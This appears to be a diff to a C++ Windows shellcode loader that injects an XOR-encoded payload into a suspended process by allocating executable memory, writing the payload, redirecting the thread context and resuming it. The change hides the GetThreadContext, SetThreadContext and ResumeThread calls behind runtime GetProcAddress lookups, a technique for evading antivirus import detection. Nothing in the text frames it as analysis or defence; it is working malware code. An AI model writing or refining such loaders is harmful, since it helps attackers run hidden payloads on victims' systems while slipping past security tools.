@@ -57,8 +57,8 @@ int main() {
     CONTEXT ctx = {0};
   
     ctx.ContextFlags = CONTEXT_FULL;
-    
-    GetThreadContext(pi.hThread, &ctx);
+    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(istfromKernel32, "GetThreadContext");
+    pGetThreadContext(pi.hThread, &ctx);
 
     LPVOID gallio = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
@@ -66,10 +66,13 @@ int main() {
         code199k[i] ^= ke[i % keLen];
     }
     pWriteProcessM(pi.hProcess, gallio, code199k, code199kLen, NULL);
-    ctx.Rcx = (DWORD64)gallio; 
-    SetThreadContext(pi.hThread, &ctx);
+    ctx.Rcx = (DWORD64)gallio;
 
-    ResumeThread(pi.hThread); 
+    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(istfromKernel32, "SetThreadContext");
+    pSetThreadContext(pi.hThread, &ctx);
+
+    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(istfromKernel32, "ResumeThread");
+    pResumeThread(pi.hThread); 
 
     return 0;
 }
